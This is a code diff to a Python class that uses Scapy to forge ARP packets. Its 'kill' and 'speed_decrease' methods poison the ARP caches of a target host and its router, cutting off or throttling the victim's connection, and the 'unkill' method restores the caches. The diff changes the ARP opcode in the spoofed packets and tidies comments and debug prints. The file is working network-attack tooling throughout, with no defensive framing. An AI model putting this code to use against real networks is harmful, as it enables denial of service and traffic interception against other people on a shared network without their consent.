@@ -1,14 +1,12 @@
 from scapy.sendrecv import srp
 from scapy.layers.l2 import ARP, Ether
 from manuf import manuf
-from scapy.all import send, get_if_addr
+from scapy.all import send, get_if_addr, conf
 import time
-import multiprocessing
 from multiprocessing import Manager
 
 
 class ScapyOperations:
-
     def __init__(self):
         manager = Manager()
         self.dead = manager.dict()
@@ -41,12 +39,10 @@ class ScapyOperations:
         return result2
 
     def kill(self, source, target_mac, target_ip, wait_after):
-        """
-        Spoofing target
-        """
+        # Spoofing target
         # Cheat target
         to_target = ARP(
-            op=2,
+            op=1,
             psrc=source[0],
             hwdst=target_mac,
             pdst=target_ip
@@ -54,7 +50,7 @@ class ScapyOperations:
 
         # Cheat source
         to_source = ARP(
-            op=2,
+            op=1,
             psrc=target_ip,
             hwdst=source[1],
             pdst=source[0]
@@ -74,10 +70,7 @@ class ScapyOperations:
                 break
 
     def unkill(self, source, target_mac, target_ip):
-        """
-        Unspoofing target
-        """
-        print(self.dead)
+        # Unspoofing target
         if target_ip in self.dead:
             self.dead.pop(target_ip)
 
@@ -102,16 +95,13 @@ class ScapyOperations:
         # Send packets to both target and router
         send(to_target, verbose=0)
         send(to_router, verbose=0)
-        print("unkilled2")
 
     def speed_decrease(self, source, target_mac, target_ip, wait_after):
         temp_speed = self.speed_of_ips[target_ip]
-        """
-        Spoofing target
-        """
+        # Spoofing target
         # Cheat target
         to_target_kill = ARP(
-            op=2,
+            op=1,
             psrc=source[0],
             hwdst=target_mac,
             pdst=target_ip
@@ -119,15 +109,13 @@ class ScapyOperations:
 
         # Cheat source
         to_source_kill = ARP(
-            op=2,
+            op=1,
             psrc=target_ip,
             hwdst=source[1],
             pdst=source[0]
         )
 
-        """
-        Unspoofing target
-        """
+        # Unspoofing target
         # Fix target
         to_target_unkill = ARP(
             op=1,
